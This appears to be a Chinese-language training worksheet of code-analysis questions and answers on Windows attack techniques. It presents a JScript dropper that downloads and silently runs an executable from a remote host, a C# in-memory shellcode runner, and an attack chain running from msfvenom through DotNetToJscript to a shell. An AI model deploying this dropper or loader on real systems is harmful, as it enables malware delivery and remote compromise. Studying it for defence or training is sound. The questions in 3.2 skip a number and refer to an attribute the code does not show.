## 三、代码分析题

### 3.1 分析以下 Jscript 代码

```javascript
var shell = new ActiveXObject("WScript.Shell");
var http = new ActiveXObject("MSXML2.XMLHTTP");
var stream = new ActiveXObject("ADODB.Stream");

http.Open("GET", "http://192.168.1.100/payload.exe", false);
http.Send();

if (http.Status == 200) {
    stream.Open();
    stream.Type = 1;
    stream.Write(http.ResponseBody);
    stream.Position = 0;
    stream.SaveToFile("C:\\temp\\update.exe", 2);
    stream.Close();
    shell.Run("C:\\temp\\update.exe", 0);
}
```

**问题**：
1. 这段代码的主要功能是什么？
2. `stream.Type = 1` 的作用是什么？
3. `SaveToFile` 的第二个参数 `2` 表示什么？
4. `shell.Run` 的第二个参数 `0` 表示什么？
5. 这段代码有什么安全风险？

### 3.2 分析以下 C# 代码

```csharp
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

public TestClass()
{
    byte[] buf = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0 /* ... */ };
    IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
    Marshal.Copy(buf, 0, addr, buf.Length);
    CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
}
```

**问题**：
1. 这段代码的目的是什么？

3. `Marshal.Copy` 的作用是什么？
4. 为什么需要 `[ComVisible(true)]` 属性？

### 代码分析题答案

**3.1 Jscript 代码分析**：

1. 从远程服务器下载可执行文件并执行（Dropper）
2. 设置流为二进制模式
3. 覆盖已存在的文件
4. 隐藏窗口执行
5. 下载并执行任意代码，可能被用于恶意目的

**3.2 C# 代码分析**：

1. 在内存中执行 shellcode
2. 0x3000 = MEM_COMMIT | MEM_RESERVE，0x40 = PAGE_EXECUTE_READWRITE
3. 将 shellcode 从托管内存复制到非托管内存
4. 使类对 COM 可见，允许 Jscript 通过 DotNetToJscript 调用

## 六、知识点总结

### 核心概念

| 概念 | 说明 |
|------|------|
| Jscript | 微软的 JavaScript 实现，可在 WSH 中执行 |
| Windows Script Host | Windows 脚本执行环境 |
| ActiveX | Windows 组件技术，Jscript 通过它访问系统功能 |
| DotNetToJscript | 将 C# 程序集嵌入 Jscript 的工具 |
| 反射式加载 | 在内存中加载 .NET 程序集的技术 |

### 关键 API

| API | 用途 |
|-----|------|
| WScript.Shell | 执行命令、访问环境变量 |
| MSXML2.XMLHTTP | HTTP 请求 |
| ADODB.Stream | 二进制流操作 |
| VirtualAlloc | 分配内存 |
| CreateThread | 创建线程 |
| Assembly.Load | 加载程序集 |

### 攻击流程

```
1. 生成 shellcode (msfvenom)
        ↓
2. 创建 C# shellcode runner
        ↓
3. 编译为 DLL
        ↓
4. 转换为 Jscript (DotNetToJscript)
        ↓
5. 可选：添加 HTML Smuggling
        ↓
6. 部署和执行
        ↓
7. 获取 shell
```
